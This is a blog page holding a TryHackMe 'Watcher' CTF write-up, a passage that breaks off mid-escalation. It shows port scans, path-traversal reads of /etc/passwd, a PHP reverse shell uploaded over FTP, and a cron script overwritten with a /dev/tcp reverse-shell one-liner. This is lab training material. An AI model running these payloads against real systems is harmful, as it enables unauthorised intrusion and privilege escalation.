@@ -1,0 +1,934 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Learn how to exploit LFI, combine it with FTP to get RCE. Learn about crontab and understand SSH.'><title>TryHackMe: Watcher Writeup</title>
+
+<link rel='canonical' href='/p/tryhackme-watcher-writeup/'>
+
+<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='TryHackMe: Watcher Writeup'>
+<meta property='og:description' content='Learn how to exploit LFI, combine it with FTP to get RCE. Learn about crontab and understand SSH.'>
+<meta property='og:url' content='/p/tryhackme-watcher-writeup/'>
+<meta property='og:site_name' content='Tanishq Chaudhary'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='lfi' /><meta property='article:tag' content='ftp' /><meta property='article:tag' content='crontab' /><meta property='article:tag' content='ssh' /><meta property='article:published_time' content='2021-06-15T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2021-06-15T00:00:00&#43;00:00'/><meta property='og:image' content='https://i.imgur.com/WSIsuRG.jpg' />
+<meta name="twitter:title" content="TryHackMe: Watcher Writeup">
+<meta name="twitter:description" content="Learn how to exploit LFI, combine it with FTP to get RCE. Learn about crontab and understand SSH."><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://i.imgur.com/WSIsuRG.jpg' />
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'G-3DJP1JG0KN', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+    </head>
+    <body class="">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.body.dataset.scheme = 'dark';
+        } else {
+            document.body.dataset.scheme = 'light';
+        }
+    })();
+</script><div class="container main-container flex on-phone--column extended article-page with-toolbar">
+            <aside class="sidebar left-sidebar sticky">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header class="site-info">
+        
+            <figure class="site-avatar">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu8feb5f378a01bc01544f018dbe1cdca8_26024_300x0_resize_q75_box.jpeg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+
+                
+            </figure>
+        
+        <h1 class="site-name"><a href="/">Tanishq Chaudhary</a></h1>
+        <h2 class="site-description">Undergrad Researcher at LTRC, IIIT-H. I like Pen-Testing &amp; NLP.</h2>
+    </header>
+
+    <ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/about/'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>About</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/categories/thm'>
+                
+                    <?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 20010904//EN"
+ "http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd">
+<svg version="1.0" xmlns="http://www.w3.org/2000/svg"
+ width="552.000000pt" height="564.000000pt" viewBox="0 0 552.000000 564.000000"
+ preserveAspectRatio="xMidYMid meet">
+
+<g transform="translate(0.000000,564.000000) scale(0.100000,-0.100000)"
+fill="#000000" stroke="none">
+<path d="M2280 5630 c-345 -48 -646 -195 -885 -435 -126 -126 -204 -230 -280
+-377 -52 -99 -134 -321 -135 -363 -1 -35 -14 -44 -91 -59 -231 -44 -420 -147
+-583 -316 -131 -136 -210 -272 -260 -444 -110 -380 4 -796 293 -1069 131 -123
+296 -215 478 -265 l98 -27 905 -3 c849 -2 907 -1 940 15 104 53 108 192 7 267
+-28 21 -35 21 -935 26 l-907 5 -88 31 c-205 74 -358 209 -451 399 -46 93 -66
+170 -73 285 -22 360 213 680 574 782 110 31 286 31 396 0 81 -23 162 -60 243
+-112 80 -50 172 -34 221 39 29 43 31 113 3 158 -49 81 -222 167 -457 229 -9 2
+-8 16 3 56 121 413 449 731 871 845 91 25 113 27 298 27 185 0 207 -2 298 -27
+450 -121 794 -479 892 -927 13 -58 13 -66 -2 -75 -8 -5 -44 -28 -79 -50 -35
+-23 -72 -51 -80 -64 -39 -55 -34 -142 9 -189 62 -67 140 -68 240 -3 215 140
+505 156 742 42 210 -102 354 -275 418 -504 28 -98 57 -139 114 -158 71 -23
+153 15 184 87 24 54 21 85 -23 219 -95 292 -323 537 -609 656 -144 59 -208 70
+-416 76 l-192 5 -12 52 c-6 28 -27 96 -46 150 -177 510 -603 883 -1138 996
+-114 24 -378 35 -485 20z"/>
+<path d="M3605 3136 c-45 -19 -92 -79 -110 -138 -20 -68 -20 -257 0 -325 32
+-107 101 -163 200 -163 140 1 204 87 213 285 8 180 -34 296 -121 336 -49 22
+-138 24 -182 5z m109 -96 c49 -18 61 -61 61 -210 0 -118 -3 -139 -21 -170 -17
+-30 -25 -35 -58 -35 -31 0 -43 6 -60 28 -19 26 -21 42 -21 170 0 172 10 204
+72 226 1 1 13 -3 27 -9z"/>
+<path d="M5120 3128 c-35 -18 -51 -35 -72 -78 -66 -133 -56 -381 19 -471 55
+-66 166 -88 249 -50 75 34 112 113 121 258 10 158 -28 281 -104 333 -53 36
+-151 40 -213 8z m147 -100 c26 -21 38 -85 38 -203 -1 -138 -16 -190 -59 -201
+-36 -9 -69 1 -84 26 -33 54 -33 306 -1 359 24 38 72 46 106 19z"/>
+<path d="M3104 3069 c-49 -39 -93 -74 -98 -79 -9 -9 40 -80 56 -80 6 0 32 18
+58 40 26 22 49 40 51 40 2 0 2 -106 0 -235 l-3 -235 71 0 71 0 0 310 0 310
+-59 0 c-58 0 -60 -1 -147 -71z"/>
+<path d="M4639 3074 c-123 -96 -117 -87 -85 -128 15 -20 31 -36 36 -36 4 0 32
+20 62 44 l53 43 -3 -238 -3 -239 66 0 65 0 0 310 0 310 -53 0 c-51 0 -58 -3
+-138 -66z"/>
+<path d="M4625 2196 c-90 -25 -135 -101 -150 -256 -9 -83 9 -206 37 -266 41
+-88 134 -129 239 -104 64 16 111 60 135 132 26 72 26 291 1 357 -46 119 -142
+169 -262 137z m97 -107 c28 -15 47 -66 54 -147 14 -153 -18 -263 -80 -270 -62
+-7 -88 53 -88 206 0 122 13 185 45 207 25 18 41 19 69 4z"/>
+<path d="M3101 2120 c-55 -44 -101 -83 -101 -86 0 -8 54 -74 62 -74 3 0 30 20
+60 44 l53 43 -4 -238 -3 -239 71 0 71 0 -2 313 -3 312 -51 3 c-51 3 -53 2
+-153 -78z"/>
+<path d="M3601 2120 c-56 -44 -101 -83 -101 -88 0 -4 13 -23 29 -42 l29 -34
+59 45 58 46 -3 -238 -3 -239 65 0 66 0 0 315 0 315 -49 0 c-47 0 -55 -4 -150
+-80z"/>
+<path d="M4125 2142 c-39 -31 -84 -68 -102 -82 l-32 -25 34 -40 33 -39 59 46
+58 45 -3 -238 -3 -239 66 0 65 0 0 315 0 315 -52 -1 c-49 0 -58 -5 -123 -57z"/>
+<path d="M4974 1356 c-71 -32 -98 -104 -92 -246 3 -73 8 -104 24 -130 58 -101
+196 -108 255 -14 21 34 24 53 27 154 3 104 1 119 -20 159 -13 25 -35 53 -49
+64 -34 25 -105 31 -145 13z m103 -93 c14 -21 18 -48 18 -128 0 -80 -4 -107
+-18 -128 -22 -34 -61 -36 -81 -4 -36 54 -27 254 12 277 29 16 51 11 69 -17z"/>
+<path d="M3073 1353 c-40 -8 -81 -59 -94 -117 -17 -77 -8 -214 17 -257 32 -55
+80 -82 137 -76 102 9 141 71 141 222 0 113 -21 180 -68 210 -27 18 -94 27
+-133 18z m92 -103 c10 -20 15 -58 15 -119 0 -129 -17 -162 -75 -147 -33 8 -48
+68 -43 173 3 62 9 88 23 103 27 30 62 26 80 -10z"/>
+<path d="M3769 1345 c-23 -10 -44 -31 -60 -58 -22 -38 -24 -54 -24 -157 0
+-130 13 -166 76 -208 27 -19 43 -23 82 -19 102 9 141 71 142 222 0 155 -40
+223 -138 231 -24 2 -57 -3 -78 -11z m108 -95 c8 -15 13 -64 13 -120 0 -56 -5
+-105 -13 -120 -17 -33 -57 -38 -83 -9 -16 18 -19 36 -19 129 0 93 3 111 19
+129 26 29 66 24 83 -9z"/>
+<path d="M5328 1304 c-38 -30 -68 -58 -68 -62 1 -4 9 -17 20 -30 21 -26 39
+-21 74 17 11 12 22 21 25 21 4 0 5 -76 3 -170 l-4 -170 51 0 51 0 0 225 0 225
+-42 0 c-37 0 -52 -8 -110 -56z"/>
+<path d="M3407 1294 c-67 -55 -70 -61 -39 -96 14 -16 17 -16 53 13 l39 31 0
+-166 0 -166 50 0 50 0 0 220 0 220 -42 0 c-37 0 -52 -8 -111 -56z"/>
+<path d="M4117 1294 c-67 -55 -70 -61 -39 -96 14 -16 17 -16 52 12 21 17 39
+30 41 30 2 0 3 -74 1 -165 l-3 -165 50 0 51 0 0 220 0 220 -42 0 c-37 0 -52
+-8 -111 -56z"/>
+<path d="M4561 825 c-49 -42 -64 -98 -59 -217 6 -156 45 -208 155 -208 100 0
+148 75 147 231 -1 92 -23 158 -65 194 -25 20 -41 25 -89 25 -48 0 -64 -5 -89
+-25z m125 -66 c16 -18 19 -37 19 -134 0 -97 -3 -116 -19 -134 -24 -27 -48 -27
+-72 0 -16 18 -19 37 -19 134 0 97 3 116 19 134 11 12 27 21 36 21 9 0 25 -9
+36 -21z"/>
+<path d="M4942 795 c-40 -31 -72 -59 -72 -63 0 -4 9 -18 19 -32 l20 -25 40 33
+41 33 0 -171 0 -171 48 3 47 3 0 220 0 220 -36 3 c-30 3 -46 -5 -107 -53z"/>
+<path d="M5271 825 c-49 -42 -64 -98 -59 -217 6 -156 45 -208 157 -208 48 0
+57 3 91 38 32 32 39 47 50 110 20 119 -5 229 -62 277 -43 36 -133 36 -177 0z
+m125 -66 c16 -18 19 -37 19 -134 0 -97 -3 -116 -19 -134 -24 -27 -48 -27 -72
+0 -16 18 -19 37 -19 134 0 97 3 116 19 134 11 12 27 21 36 21 9 0 25 -9 36
+-21z"/>
+<path d="M3019 715 c-69 -37 -81 -224 -19 -287 52 -51 146 -32 169 34 19 54
+14 178 -9 216 -31 50 -89 65 -141 37z m79 -58 c18 -21 25 -109 13 -154 -14
+-50 -39 -63 -63 -33 -20 25 -25 130 -8 174 10 28 40 35 58 13z"/>
+<path d="M3280 684 c-53 -42 -54 -43 -35 -68 15 -19 15 -19 38 2 13 12 26 22
+30 22 4 0 7 -54 7 -121 l0 -120 33 3 32 3 3 158 3 157 -33 0 c-23 0 -47 -11
+-78 -36z"/>
+<path d="M3913 320 c-35 -14 -55 -55 -61 -125 -5 -73 11 -145 38 -170 10 -9
+37 -19 59 -22 80 -11 121 45 121 164 0 127 -65 190 -157 153z m77 -65 c14 -17
+18 -136 6 -172 -9 -29 -35 -37 -57 -17 -15 14 -19 32 -19 91 0 41 5 83 10 94
+13 23 43 25 60 4z"/>
+<path d="M4167 284 c-52 -40 -52 -41 -33 -67 13 -17 15 -16 45 9 l31 26 0
+-126 0 -126 30 0 30 0 0 160 0 160 -28 0 c-18 0 -47 -14 -75 -36z"/>
+</g>
+</svg>
+
+                
+                <span>TryHackMe Writeups</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/tags/'>
+                
+                    <?xml version="1.0" encoding="iso-8859-1"?>
+<!-- Generator: Adobe Illustrator 16.0.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
+	 width="500.536px" height="500.536px" viewBox="0 0 500.536 500.536" style="enable-background:new 0 0 500.536 500.536;"
+	 xml:space="preserve">
+<g>
+	<path d="M410.614,323.309L186.108,98.815c-2.444-2.444-5.754-3.818-9.212-3.818H94.702c-5.925-7.524-13.878-13.97-23.241-18.613
+		c-22.529-11.198-47.907-9.351-61.738,4.465c-2.554,2.556-4.661,5.473-6.239,8.674c-5.11,10.272-4.581,22.481,1.472,34.362
+		c5.834,11.464,16.178,21.311,29.143,27.745c5.816,2.887,11.818,4.888,17.765,6.064v62.329c0.006,3.458,1.38,6.78,3.824,9.218
+		l224.494,224.499c5.095,5.096,13.34,5.096,18.436,0L410.62,341.738C415.703,336.655,415.703,328.403,410.614,323.309z
+		 M55.688,98.815c-2.438,2.438-3.818,5.763-3.818,9.212v40.802c-4.648-1.067-9.327-2.713-13.905-4.983
+		c-11.298-5.609-20.28-14.097-25.263-23.909c-4.776-9.369-5.284-18.799-1.434-26.545c1.162-2.355,2.705-4.51,4.604-6.393
+		c11.222-11.222,32.492-12.383,51.725-2.831c5.861,2.905,11.065,6.591,15.448,10.829H64.905
+		C61.445,94.988,58.132,96.365,55.688,98.815z M84.364,127.497c3.487-3.49,7.826-5.627,12.354-6.428
+		c0.399,4.82-0.375,9.425-2.415,13.547c-1.162,2.355-2.71,4.51-4.61,6.398c-3.18,3.183-7.19,5.523-11.724,7.075
+		C76.635,140.85,78.76,133.098,84.364,127.497z M117.139,160.272c-9.049,9.049-23.726,9.049-32.775,0
+		c-1.271-1.271-2.353-2.657-3.257-4.125c5.654-1.969,10.702-4.947,14.738-8.984c2.557-2.554,4.661-5.471,6.242-8.671
+		c2.657-5.353,3.76-11.225,3.378-17.295c4.28,0.883,8.364,2.979,11.68,6.301C126.188,136.546,126.188,151.217,117.139,160.272z
+		 M496.717,315.631L384.725,427.628c-5.095,5.089-13.352,5.089-18.441,0l-5.674-5.675l69.83-69.841
+		c4.899-4.889,7.589-11.391,7.589-18.3c0-6.91-2.684-13.412-7.583-18.294L205.957,91.013c-4.903-4.891-11.399-7.578-18.291-7.578
+		h-49.694v-1.519c0-3.455,1.38-6.773,3.827-9.218c2.444-2.441,5.748-3.818,9.206-3.818h18.146
+		c-4.389-4.232-9.599-7.923-15.447-10.829c-19.24-9.552-40.51-8.39-51.731,2.832c-1.894,1.882-3.431,4.037-4.613,6.393
+		c-0.556,1.138-0.999,2.311-1.374,3.517c-2.474-1.581-5.003-3.083-7.654-4.412c0.381-0.999,0.762-2.004,1.241-2.974
+		c1.596-3.194,3.691-6.111,6.25-8.674c13.819-13.816,39.215-15.658,61.738-4.466c9.357,4.643,17.315,11.089,23.235,18.613h82.198
+		c3.446,0,6.768,1.377,9.215,3.818l224.496,224.497C501.812,302.29,501.812,310.548,496.717,315.631z"/>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+</svg>
+
+                
+                <span>Tags</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search/'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+
+        
+            <li id="dark-mode-toggle">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                <span>Dark Mode</span>
+            </li>
+        
+    </ol>
+</aside>
+
+            <main class="main full-width">
+    <div id="article-toolbar">
+        <a href="/" class="back-home">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+            <span>Back</span>
+        </a>
+    </div>
+
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/tryhackme-watcher-writeup/">
+                
+                    <img src="https://i.imgur.com/WSIsuRG.jpg" loading="lazy" alt="Featured image of post TryHackMe: Watcher Writeup" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/thm/" style="background-color: #2a9d8f; color: #fff;">
+                TryHackMe
+            </a>
+        
+    </header>
+    
+
+    <h2 class="article-title">
+        <a href="/p/tryhackme-watcher-writeup/">TryHackMe: Watcher Writeup</a>
+    </h2>
+
+    
+    <h3 class="article-subtitle">
+        Learn how to exploit LFI, combine it with FTP to get RCE. Learn about crontab and understand SSH.
+    </h3>
+    <footer class="article-time">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <time class="article-time--published">Jun 15, 2021</time>
+    </footer></div>
+</header>
+
+    <section class="article-content">
+    <p><a class="link" href="https://tryhackme.com/room/watcher"  target="_blank" rel="noopener"
+    >Play</a></p>
+<h2 id="1-enumeration--exploration">1. Enumeration &amp; Exploration</h2>
+<h3 id="11-port-scanning">1.1. Port Scanning</h3>
+<pre><code>┌──(kali㉿kali)-[~]
+└─$ nmap -sC -sV -A 10.10.157.202
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-25 11:48 EDT
+Nmap scan report for 10.10.157.202
+Host is up (0.24s latency).
+Not shown: 996 closed ports
+PORT     STATE    SERVICE VERSION
+21/tcp   open     ftp     vsftpd 3.0.3
+22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 e1:80:ec:1f:26:9e:32:eb:27:3f:26:ac:d2:37:ba:96 (RSA)
+|   256 36:ff:70:11:05:8e:d4:50:7a:29:91:58:75:ac:2e:76 (ECDSA)
+|_  256 48:d2:3e:45:da:0c:f0:f6:65:4e:f9:78:97:37:aa:8a (ED25519)
+80/tcp   open     http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-generator: Jekyll v4.1.1
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Corkplacemats
+5815/tcp filtered unknown
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 32.88 seconds
+</code></pre><p>ftp, ssh, https. Notin too special. Let&rsquo;s look at web stuff.</p>
+<h3 id="12-web-enumeration">1.2. Web Enumeration</h3>
+<pre><code>┌──(kali㉿kali)-[~]
+└─$ gobuster dir -u 10.10.157.202 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 32 -q         
+/images               (Status: 301) [Size: 315] [--&gt; http://10.10.157.202/images/]
+/css                  (Status: 301) [Size: 312] [--&gt; http://10.10.157.202/css/]   
+/server-status        (Status: 403) [Size: 278]   
+</code></pre><p>This was fairly slow &hellip; and in the end unhelpful. Doing simultaneous exploration is a good idea!</p>
+<h3 id="13-web-exploration">1.3. Web Exploration</h3>
+<p>The homepage,
+<img src="https://i.imgur.com/c9ZFchq.png" alt="homepage of the THM Watcher room"  /></p>
+<p><code>robots.txt</code> is usually a good place to look.
+<img src="https://i.imgur.com/fPeuBjd.png" alt="A screenshot of the page showing robots.txt file"  /></p>
+<p>Yes! We have our first flag!</p>
+<p>Exploring more, we have the post structure &hellip; sus. LFI?
+<img src="https://i.imgur.com/P6M7dH9.png" alt="A page showing probable PHP LFI"  /></p>
+<h3 id="14-php-lfi">1.4. PHP LFI</h3>
+<p>Let&rsquo;s try some basic stuff. <code>../../../etc/hosts</code> works!</p>
+<p><img src="https://i.imgur.com/TXKROye.png" alt="/etc/hosts working. LFI present in the system."  /></p>
+<p>How about <code>../../../etc/passwd</code>
+<img src="https://i.imgur.com/mDVT7Sp.png" alt="/etc/password working. Showing a list of interesting users."  /></p>
+<p>Interesting candidates:</p>
+<ul>
+<li>mat</li>
+<li>toby</li>
+<li>will</li>
+</ul>
+<p>Just to check, I tried getting <code>flag_1.txt</code>. Worked. Then, I looked at the second file mentioned in the same <code>robots.txt</code></p>
+<p><img src="https://i.imgur.com/5n8Xta1.png" alt=""  />
+We get the creds for ftp!</p>
+<h3 id="15-ftp">1.5 FTP</h3>
+<p>Log in.</p>
+<pre><code>┌──(kali㉿kali)-[/tmp]
+└─$ ftp 10.10.157.202
+Connected to 10.10.157.202.
+220 (vsFTPd 3.0.3)
+Name (10.10.157.202:kali): *******
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls -la
+dr-xr-xr-x    3 65534    65534        4096 Dec 03 01:58 .
+dr-xr-xr-x    3 65534    65534        4096 Dec 03 01:58 ..
+drwxr-xr-x    2 1001     1001         4096 Dec 03 03:30 files
+-rw-r--r--    1 0        0              21 Dec 03 01:58 flag_2.txt
+226 Directory send OK.
+ftp&gt; get flag_2.txt
+ftp&gt; cd files
+ftp&gt; ls -la
+drwxr-xr-x    2 1001     1001         4096 Dec 03 03:30 .
+dr-xr-xr-x    3 65534    65534        4096 Dec 03 01:58 ..
+226 Directory send OK.
+</code></pre><p>Clearly, the message in the file we saw on the web server hinted at directories being connected. We also have the ability to access local files &hellip;</p>
+<h3 id="16-lfi--ftp--rce">1.6 LFI + FTP = RCE?</h3>
+<p>I tried putting in a file,</p>
+<pre><code>ftp&gt; put haha.png 
+local: haha.png remote: haha.png
+200 PORT command successful. Consider using PASV.
+150 Ok to send data.
+226 Transfer complete.
+11007 bytes sent in 0.00 secs (37.4896 MB/s)
+</code></pre><p><img src="https://i.imgur.com/qDyqE9I.png" alt="File upload working using LFI vulnerability and FTP"  /></p>
+<p>Works!</p>
+<h2 id="2-foothold">2. Foothold</h2>
+<p>Time to get in. Get the shell from <a class="link" href="http://revshells.com/"  target="_blank" rel="noopener"
+    >RevShells</a></p>
+<pre><code>ftp&gt; cd files
+250 Directory successfully changed.
+ftp&gt; put phprevshell.php 
+local: phprevshell.php remote: phprevshell.php
+200 PORT command successful. Consider using PASV.
+150 Ok to send data.
+226 Transfer complete.
+2585 bytes sent in 0.00 secs (34.7218 MB/s)
+ftp&gt; 
+221 Goodbye.
+</code></pre><p>Start the listener.</p>
+<pre><code>┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 1337
+listening on [any] 1337 ...
+connect to [10.17.8.184] from (UNKNOWN) [10.10.157.202] 42726
+Linux watcher 4.15.0-128-generic #131-Ubuntu SMP Wed Dec 9 06:57:35 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 16:25:10 up 39 min,  0 users,  load average: 0.00, 0.00, 0.19
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+sh: 0: can't access tty; job control turned off
+$ bash -i
+bash: cannot set terminal process group (914): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@watcher:/$ 
+</code></pre><p>And we have the flag!</p>
+<pre><code>www-data@watcher:/$ find -type f -name 'flag_3.txt' 2&gt;/dev/null
+./var/www/html/more_secrets_******/flag_3.txt
+</code></pre><p>ez</p>
+<h2 id="3-priv-esc">3. Priv Esc</h2>
+<h3 id="31-lateral-privesc-toby">3.1. Lateral PrivEsc: Toby</h3>
+<p>Time to start getting to root.</p>
+<pre><code>www-data@watcher:/$ sudo -l
+sudo -l
+Matching Defaults entries for www-data on watcher:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on watcher:
+    (toby) NOPASSWD: ALL
+</code></pre><p>And that was pretty basic &hellip;</p>
+<pre><code>www-data@watcher:/$ sudo -u toby bash
+sudo -u toby bash
+whoami
+toby
+</code></pre><p>Great. How about now looking at what toby got for us.</p>
+<pre><code>toby@watcher:~$ ls
+ls
+flag_4.txt
+jobs
+note.txt
+</code></pre><pre><code>toby@watcher:~$ cat note.txt
+cat note.txt
+Hi Toby,
+
+I've got the cron jobs set up now so don't worry about getting that done.
+
+Mat
+</code></pre><p>Exploring, we find the following. What a script. wow.</p>
+<pre><code>toby@watcher:~/jobs$ cat cow.sh
+cat cow.sh
+#!/bin/bash
+cp /home/mat/cow.jpg /tmp/cow.jpg
+</code></pre><p>The note mentions something to do with cron job. Let&rsquo;s check <code>crontab</code>.</p>
+<pre><code>toby@watcher:/etc$ cat crontab
+cat crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )
+#
+*/1 * * * * mat /home/toby/jobs/cow.sh
+</code></pre><h3 id="32-lateral-privesc-again-mat">3.2. Lateral PrivEsc (again): Mat</h3>
+<p>We put a revshell command and &hellip; we wait!</p>
+<pre><code>toby@watcher:~/jobs$ cat cow.sh
+cat cow.sh
+sh -i &gt;&amp; /dev/tcp/10.17.8.184/1234 0&gt;&amp;1
+</code></pre><p>Listening.</p>
+<pre><code>┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 1234         
+listening on [any] 1234 ...
+connect to [10.17.8.184] from (UNKNOWN) [10.10.157.202] 55854
+sh: 0: can't access tty; job control turned off
+$ whoami
+mat
+</code></pre><p>We are in! Let&rsquo;s explore.</p>
+<pre><code>mat@watcher:~$ cat note.txt
+cat note.txt
+Hi Mat,
+
+I've set up your sudo rights to use the python script as my user. You can only run the script with sudo so it should be safe.
+
+Will
+</code></pre><p>Why do they tell us what to do EXACTLY XD</p>
+<pre><code>mat@watcher:~/scripts$ sudo -l
+sudo -l
+Matching Defaults entries for mat on watcher:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User mat may run the following commands on watcher:
+    (will) NOPASSWD: /usr/bin/python3 /home/mat/scripts/will_script.py *
+</code></pre><pre><code>mat@watcher:~/scripts$ cat cmd.py
+cat cmd.py
+def get_command(num):
